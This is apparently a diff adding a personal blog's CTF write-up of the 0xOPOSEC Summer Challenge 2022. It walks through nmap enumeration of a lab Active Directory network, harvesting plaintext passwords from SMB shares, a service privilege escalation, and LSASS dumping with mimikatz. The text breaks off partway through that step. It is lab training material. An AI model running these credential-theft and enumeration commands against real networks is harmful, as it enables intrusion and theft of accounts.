@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>0xOPOSEC Summer Challenge 2022 | Bruno Blog</title>
+<meta name="keywords" content="CTF">
+<meta name="description" content="&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;
+Index
+
+Larapios Group Access {RECON}
+Spread Your Hacks {RECON}
+Big Dollar Spender {WINDOWS}
+Other Os Are People 2 {RECON}
+CAPtain Pwn! {LINUX}
+SO Cute! {LINUX}
+Stairway To Heaven {WINDOWS}
+Conclusion
+
+
+First recon
+Larapios Group Access
+&ldquo;Larapios Group states that they access to our core infrastructure!
+They claim that our security is lacking and have credentials to access our systems.
+Quickly, grab the access and gain access to one of the internal machines!&rdquo;">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/2022-08-21-0xoposec/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/2022-08-21-0xoposec/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Bruno Blog (Alt + H)">Bruno Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      0xOPOSEC Summer Challenge 2022
+    </h1>
+    <div class="post-meta"><span title='2022-08-21 00:00:00 +0000 UTC'>August 21, 2022</span>&nbsp;·&nbsp;10 min
+
+</div>
+  </header> 
+  <div class="post-content"><p>&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;</p>
+<h2 id="index">Index<a hidden class="anchor" aria-hidden="true" href="#index">#</a></h2>
+<ul>
+<li><a href="#first-recon">Larapios Group Access {RECON}</a></li>
+<li><a href="#second-recon">Spread Your Hacks {RECON}</a></li>
+<li><a href="#first-windows-priv-esc">Big Dollar Spender {WINDOWS}</a></li>
+<li><a href="#third-recon">Other Os Are People 2 {RECON}</a></li>
+<li><a href="#first-linux-priv-esc">CAPtain Pwn! {LINUX}</a></li>
+<li><a href="#second-linux-priv-esc">SO Cute! {LINUX}</a></li>
+<li><a href="#second-windows-priv-esc">Stairway To Heaven {WINDOWS}</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+<br>
+<h2 id="first-recon">First recon<a hidden class="anchor" aria-hidden="true" href="#first-recon">#</a></h2>
+<h3 id="larapios-group-access">Larapios Group Access<a hidden class="anchor" aria-hidden="true" href="#larapios-group-access">#</a></h3>
+<p><em>&ldquo;Larapios Group states that they access to our core infrastructure!
+They claim that our security is lacking and have credentials to access our systems.
+Quickly, grab the access and gain access to one of the internal machines!&rdquo;</em></p>
+<br>
+<ul>
+<li>First thing I did was to find all the up hosts and then find more info about those and for that I used nmap</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sn 192.168.111.0/24
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.26
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.30
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.31
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.34
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.36
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.41
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.42
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$  nmap -O 192.168.111.0/24
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.26
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.035s latency<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">988</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp   open  domain
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp open  	<span style="color:#586e75">`</span>
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.30
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.050s latency<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">996</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.31
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.14s latency<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">999</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.34
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.13s latency<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">999</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.36
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.14s latency<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">996</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.41
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.049s latency<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">996</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.42
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.15s latency<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">996</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
+</span></span></code></pre></div><ul>
+<li>Since this returned so much info I grouped everything by Windows and Linux machines by using the TTL when pinging and got the following</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.111.26:Windows
+</span></span><span style="display:flex;"><span>192.168.111.30:Windows
+</span></span><span style="display:flex;"><span>192.168.111.31:Linux
+</span></span><span style="display:flex;"><span>192.168.111.34:Linux
+</span></span><span style="display:flex;"><span>192.168.111.36:Windows
+</span></span><span style="display:flex;"><span>192.168.111.41:Windows
+</span></span><span style="display:flex;"><span>192.168.111.42:Windows
+</span></span></code></pre></div><ul>
+<li>Grabing the first machine (Windows) I wanted to enumerate more and since this is most likely using Windows AD why not enumerate for LDAP? After enumerating I got the respective domain <code>bajordas.local</code> and the DC</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -n -sV --script <span style="color:#2aa198">&#34;ldap* and not brute&#34;</span> 192.168.111.26
+</span></span><span style="display:flex;"><span>ldapServiceName: bajordas.local:win-dc01<span style="color:#268bd2">$@</span>BAJORDAS.LOCAL
+</span></span></code></pre></div><ul>
+<li>Next thing I did was to enumerate all Windows machines for RDP since its a common service used by Windows and doing this got a lot more info like machine names and some juicy info</li>
+</ul>
+<pre tabindex="0"><code>192.168.111.26
+|   NetBIOS_Computer_Name: WIN-DC01
+|   DNS_Computer_Name: WIN-DC01.bajordas.local
+
+192.168.111.30
+|   NetBIOS_Computer_Name: LAB-SHARE01
+|   DNS_Computer_Name: LAB-SHARE01.bajordas.local
+
+192.168.111.36
+|   NetBIOS_Computer_Name: WIN-MGMT
+|   DNS_Computer_Name: WIN-MGMT.bajordas.local
+
+192.168.111.41
+|   NetBIOS_Computer_Name: LAB-WIN6
+|   DNS_Computer_Name: LAB-WIN6.bajordas.local
+
+192.168.111.42
+|   NetBIOS_Computer_Name: LAB-WIN7
+|   DNS_Computer_Name: LAB-WIN7.bajordas.local
+</code></pre><ul>
+<li>Next, but still in the enumeration process I enumerated smb and found powershell scripts on <code>.30</code> machine</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 192.168.111.30
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>users1.ps1
+</span></span><span style="display:flex;"><span>provisionUsers.ps1
+</span></span></code></pre></div><ul>
+<li>provisionUsers.ps1 had creds for sedalfino</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">sedalfino.freitas</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span>
+</span></span></code></pre></div><ul>
+<li>users1.ps1 was a golden mine with more user creds</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#268bd2">#new</span> <span style="color:#268bd2">joiners</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">rogerio.marques</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">rute.rodrigues</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">rita.munoiz</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">renato.recesso</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">carolina.azevedo</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">casemiro.silva</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">jose.borges</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">stefan.silva</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">mary.christmas</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">rodgers.john</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+</span></span></code></pre></div><ul>
+<li>Knowing this I tried to authenticate anonymously on <code>.30</code> to check those shares</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ smbclient --no-pass -L //192.168.111.30/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>	---------       ----      -------
+</span></span><span style="display:flex;"><span>	ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>	Admins$         Disk
+</span></span><span style="display:flex;"><span>	Backups         Disk
+</span></span><span style="display:flex;"><span>	C$              Disk      Default share
+</span></span><span style="display:flex;"><span>	IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>	Scripts         Disk
+</span></span><span style="display:flex;"><span>	Users           Disk
+</span></span></code></pre></div><ul>
+<li>After this I tried to the creds I&rsquo;ve found but only <code>sedalfino.freitas</code> were working but still I got the same privileges as anonymous</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ smbmap -u <span style="color:#2aa198">&#39;sedalfino.freitas&#39;</span> -p <span style="color:#2aa198">&#39;Summer2022&#39;</span> -d <span style="color:#2aa198">&#39;bajordas&#39;</span> -H 192.168.111.26
+</span></span></code></pre></div><ul>
+<li>After some minutes (hours?) I decided to use xfreerdp and connect to any machine and I was able to do that on <code>.41</code> but using remmina with <code>sedalfino.freitas:Summer2022</code> and <code>BAJORDAS.LOCAL</code> creds</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>oneSmallFootInTheEnterprise<span style="color:#719e07">}</span>
+</span></span></code></pre></div><br>
+<h2 id="second-recon">Second recon<a hidden class="anchor" aria-hidden="true" href="#second-recon">#</a></h2>
+<h3 id="spread-your-hacks">Spread Your Hacks<a hidden class="anchor" aria-hidden="true" href="#spread-your-hacks">#</a></h3>
+<p><em>&ldquo;You got in? Noice!&rdquo;</em>
+<em>&ldquo;I heard they got a special machine for &ldquo;Important People&rdquo;, but they are not very security-focused and their automation is faulty. Can you access it?&rdquo;</em></p>
+<br>
+<ul>
+<li>
+<p>I already enumed a lot for the Windows machines so now I tried to jump to some Linux ones and used <code>enum4linux</code> for that</p>
+</li>
+<li>
+<p>enum4linux gave me some creds</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ enum4linux -u <span style="color:#2aa198">&#34;sedalfino.freitas&#34;</span> -p <span style="color:#2aa198">&#34;Summer2022&#34;</span> -U 192.168.111.26<span style="color:#586e75">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>index: 0x109a RID: 0x454 acb: 0x00000210 Account: big.boss Name: big boss Desc: Password: Money<span style="color:#268bd2">$$</span>$ , make all managers the same password so I have access
+</span></span></code></pre></div><ul>
+<li>
+<p>Using <code>big.boss:Money$$$</code> I was able to rdp to <code>192.168.111.41</code> and <code>192.168.42</code></p>
+</li>
+<li>
+<p>On <code>192.168.111.42</code> I&rsquo;ve found the flag</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>slowMovingRabbit<span style="color:#719e07">}</span>
+</span></span></code></pre></div><br>
+<h2 id="first-windows-priv-esc">First Windows Priv Esc<a hidden class="anchor" aria-hidden="true" href="#first-windows-priv-esc">#</a></h2>
+<h3 id="big-dollar-spender">Big Dollar Spender<a hidden class="anchor" aria-hidden="true" href="#big-dollar-spender">#</a></h3>
+<p><em>&ldquo;You in? Nice! Can you pwn it? Maybe&hellip;&rdquo;</em></p>
+<p><em>&ldquo;They installed some shady service and hammered things down to make it work. Maybe it can be exploited in your favour&rdquo;</em></p>
+<br>
+<ul>
+<li>While doing enumeration and research on <code>192.168.111.42</code> i noticed a strange file</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186279966-faba5a17-86f1-4f63-8963-247f750c18fc.png"></p>
+<ul>
+<li>winPEAS did a great job identifing the strange file permissions</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186280079-4c18c89c-ef06-412b-9773-84af9b6abbff.png"></p>
+<ul>
+<li>
+<p>After some hours of digging google and trying to understand how could I exploit this, I noticed that I could execute the file</p>
+</li>
+<li>
+<p>Everytime I tried executing the file I had an error</p>
+</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186280294-3cdf01b3-8e15-4300-92df-01b68d8120e2.png"></p>
+<ul>
+<li>
+<p>Then I created a malicious .bat file that creates an user and gives permissions to that user but that didn&rsquo;t work either</p>
+</li>
+<li>
+<p>Next thing was to use <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/powerup">PowerUp</a></p>
+</li>
+<li>
+<p>With PowerUp executed I noticed a couple stuff i could do like abusing the service <code>bajordas-svc</code> with PowerUp</p>
+</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186280695-ce41f69b-a109-4bdc-b58c-1c10be302f2c.png"></p>
+<ul>
+<li>Abused the <code>bajordas-svc</code> and got a new user with Admin privileges</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186280851-bcfbd706-5081-4571-b07e-10dae5b5393b.png"></p>
+<ul>
+<li>To sign-in as this user I used rdp and got the flag inside <code>C:\Users\Administrator\Desktop</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>GameOn!<span style="color:#719e07">}</span>
+</span></span></code></pre></div><br>
+<h2 id="third-recon">Third recon<a hidden class="anchor" aria-hidden="true" href="#third-recon">#</a></h2>
+<h3 id="other-os-are-people-2">Other Os Are People 2<a hidden class="anchor" aria-hidden="true" href="#other-os-are-people-2">#</a></h3>
+<p><em>&ldquo;Larapios said there are some Linux machines loose in the environment and the System Administrator reuses their credentials 😩.&rdquo;</em></p>
+<p><em>&ldquo;Can you access them?&rdquo;</em></p>
+<br>
+<ul>
+<li>
+<p>I jumped to <code>192.168.111.41</code> to try to find creds because they could be helpful to the future</p>
+</li>
+<li>
+<p>First thing I did was to use <a href="https://github.com/ParrotSec/mimikatz">mimikatz</a></p>
+</li>
+<li>
+<p>For somereason I had touble using mimikatz to dump some creds, even with the latest version I wasn&rsquo;t lucky</p>
+</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186284584-2eff753a-cad1-42b0-a1e9-4d16a1d82d03.png"></p>
+<ul>
+<li>@darkcookie gave me an hint so I tried to <a href="https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf">dump the LSASS</a> and then use the minidump to get stored credentials</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186284823-3f6bcb3d-6c7d-42f3-9e2b-226be1338436.png"></p>
+<ul>
+<li>After following the medium guide I got a creds for <code>bacano.do.it</code> and some other known accounts</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186285244-3ec93fc5-5d87-44ea-b7b5-2c9b66f6ff59.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#cb4b16">\U</span>sers<span style="color:#cb4b16">\b</span>run0<span style="color:#cb4b16">\D</span>esktop&gt; .<span style="color:#cb4b16">\m</span>imikatz.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 <span style="color:#719e07">(</span>x64<span style="color:#719e07">)</span> <span style="color:#586e75">#19041 Aug 10 2021 17:19:53</span>
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#586e75">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span style="display:flex;"><span> <span style="color:#586e75">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#586e75">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#2aa198">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#719e07">(</span> vincent.letoux@gmail.com <span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#2aa198">&#39;#####&#39;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#586e75"># lsadump::trust /patch</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#586e75"># sekurlsa::minidump C:\Users\brun0\AppData\Local\Temp\lsass.DMP</span>
+</span></span><span style="display:flex;"><span>Switch to MINIDUMP : <span style="color:#2aa198">&#39;C:\Users\brun0\AppData\Local\Temp\lsass.DMP&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#586e75"># sekurlsa::logonpasswords</span>
+</span></span><span style="display:flex;"><span>Opening : <span style="color:#2aa198">&#39;C:\Users\brun0\AppData\Local\Temp\lsass.DMP&#39;</span> file <span style="color:#719e07">for</span> minidump...
